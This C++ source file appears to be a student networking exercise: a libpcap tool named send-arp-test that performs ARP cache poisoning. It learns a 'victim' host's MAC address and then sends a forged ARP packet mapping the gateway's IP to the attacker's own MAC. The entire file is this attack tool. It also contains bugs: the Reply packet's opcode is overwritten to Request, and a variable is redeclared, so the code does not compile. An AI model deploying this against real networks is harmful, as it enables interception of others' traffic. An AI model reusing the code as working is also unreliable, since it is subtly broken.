#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
// #include "ip.h"
#include "myAddr.h"
#include <string>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

int sendArpPacket(pcap_t* handle, std::string aprHdr,Mac ethSmac, Mac ethDmac, 
					Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip){
	EthArpPacket packet;
	if (aprHdr == "Request"){
		packet.arp_.op_ = htons(ArpHdr::Request);
	} else if (aprHdr == "Reply") {
		packet.arp_.op_ = htons(ArpHdr::Reply);
	} else {
		printf("arp op error");
	}

	packet.eth_.dmac_ = Mac(ethDmac);
	packet.eth_.smac_ = Mac(ethSmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(arpSmac);
	packet.arp_.sip_ = htonl(arpSip);
	packet.arp_.tmac_ = Mac(arpTmac);
	packet.arp_.tip_ = htonl(arpTip);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	return res;
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// Victim IP
	Ip senderIp{argv[2]};
	
	// Normally Gateway
	Ip targetIp{argv[3]};

	// 자신의 Mac 주소 값을 알아냄
	Mac broadCastMac = Mac("ff:ff:ff:ff:ff:ff");
	Mac zeroMac = Mac("00:00:00:00:00:00");
	Mac myMac = my_mac_addr();
	Ip	myIp  = my_ip_addr();
	Mac senderMac;

	// Sender(Victim)의 Mac 주소를 알아옴
	// ARP request 송신
	// handle, Mac ethSmac, Mac ethDmac, Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip
	int res = sendArpPacket(handle, "Request", myMac, broadCastMac, myMac, myIp, zeroMac, senderIp);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	// ARP reply 수신
	// 패킷을 받고
	while (true) {
		struct pcap_pkthdr* header;
		const u_char*		packet;
		const EthHdr*		ethernet;
		const ArpHdr*		arp;

		int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

		ethernet = (EthHdr*)(packet);
		if(ethernet->type_ != EthHdr().Arp || ethernet->dmac_ != myMac){
			continue;
		};

		arp = (ArpHdr*)(packet + sizeof(EthHdr));
		if(arp->tip_ != myIp) {
			continue;
		}

		senderMac = arp->smac_;
		break;

	}
	// handle, Mac ethSmac, Mac ethDmac, Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip
	int res = sendArpPacket(handle, "Reply", myMac, senderMac, myMac, targetIp, senderMac, senderIp);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

/*
	packet.eth_.dmac_ = Mac("00:00:00:00:00:00");
	packet.eth_.smac_ = Mac("00:00:00:00:00:00");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("00:00:00:00:00:00");
	packet.arp_.sip_ = htonl(Ip("0.0.0.0"));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(targetIp);
	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
*/
	printf("finish");
	pcap_close(handle);
}